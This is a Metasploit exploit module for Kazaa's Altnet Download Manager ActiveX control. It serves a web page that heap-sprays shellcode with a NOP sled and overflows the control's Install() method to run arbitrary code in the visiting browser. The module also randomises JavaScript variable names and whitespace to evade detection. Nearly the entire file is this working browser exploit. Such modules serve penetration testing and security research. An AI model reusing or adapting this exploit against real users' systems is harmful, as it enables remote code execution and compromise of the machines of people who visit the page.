##
# $Id: kazaa_altnet_heap.rb 4953 2007-05-21 20:51:13Z hdm $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##

require 'msf/core'

module Msf

class Exploits::Windows::Browser::Kazaa_Altnet_Heap < Msf::Exploit::Remote

	include Exploit::Remote::HttpServer::HTML

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Kazaa Altnet Download Manager ActiveX Control Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack overflow in the Altnet Download Manager ActiveX
					Control (amd4.dll) bundled with Kazaa Media Desktop 3.2.7.
					By sending a overly long string to the "Install()" method, an attacker may be
					able to execute arbitrary code.
			},
			'License'        => MSF_LICENSE,
			'Author'         => [ 'MC' ], 
			'Version'        => '$Revision$',
			'References'     => 
				[
					[ 'URL', 'http://secunia.com/advisories/26970/' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'         => 1024,
					'BadChars'      => "\x00",
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Windows XP SP0-SP2 / IE 6.0SP1 English', { 'Ret' => '\x0c\x0c\x0c\x0c' } ]	
				],
			'DisclosureDate' => 'Oct 3 2007',
			'DefaultTarget'  => 0))
	end

	def autofilter
		false
	end

	def check_dependencies
		use_zlib
	end

	def on_request_uri(cli, request)
		# Re-generate the payload
		return if ((p = regenerate_payload(cli)) == nil)

		# Encode the shellcode
		shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))

		# Create some nops
		nops = Rex::Text.to_unescape(make_nops(4))

		# Randomize the javascript variable names
		vname  = rand_text_alpha(rand(100) + 1)
		var_i  = rand_text_alpha(rand(30)+2)
		rand1  = rand_text_alpha(rand(100) + 1)
		rand2  = rand_text_alpha(rand(100) + 1)
		rand3  = rand_text_alpha(rand(100) + 1)
		rand4  = rand_text_alpha(rand(100) + 1)
		rand5  = rand_text_alpha(rand(100) + 1)
		rand6  = rand_text_alpha(rand(100) + 1)
		rand7  = rand_text_alpha(rand(100) + 1)
		rand8  = rand_text_alpha(rand(100) + 1)

		# Build out the message
		content =
			"<html>\n" +
			"<object classid='clsid:DEF37997-D9C9-4A4B-BF3C-88F99EACEEC2' id='#{vname}'></object>\n" +
			"<script language='javascript'>\n" +
			"#{rand1} = unescape('#{shellcode}');\n" +
			"#{rand2} = unescape('#{nops}');\n" +
			"#{rand3} = 20;\n" +
			"#{rand4} = #{rand3}+#{rand1}.length\n" +
			"while (#{rand2}.length<#{rand4}) #{rand2}+=#{rand2};\n" +
			"#{rand5} = #{rand2}.substring(0, #{rand4});\n" +
			"#{rand6} = #{rand2}.substring(0, #{rand2}.length-#{rand4});\n" +
			"while(#{rand6}.length+#{rand4}<0x30000) #{rand6} = #{rand6}+#{rand6}+#{rand5};\n" +
			"#{rand7} = new Array();\n" +
			"for (#{var_i}=0; #{var_i}<400; #{var_i}++) #{rand7}[#{var_i}] = #{rand6} + #{rand1};\n" +
			"#{rand8} = '#{target.ret}';\n" +
			"while (#{rand8}.length < 5000) #{rand8}+=#{rand8};\n" +
			"#{vname}.Install(#{vname} ,#{rand8} ,#{vname}, 1);\n" +
			"</script>\n" +
			"</html>"

		# Randomize the whitespace in the document
		content.gsub!(/\s+/) do |s|
			len = rand(100)+2
			set = "\x09\x20\x0d\x0a"
			buf = ''
				
			while (buf.length < len)
				buf << set[rand(set.length)].chr
			end
			buf

		end
	
		print_status("Sending exploit to #{cli.peerhost}:#{cli.peerport}...")

		# Transmit the response to the client
		send_response_html(cli, content)
		
		# Handle the payload
		handler(cli)
	end

end
end
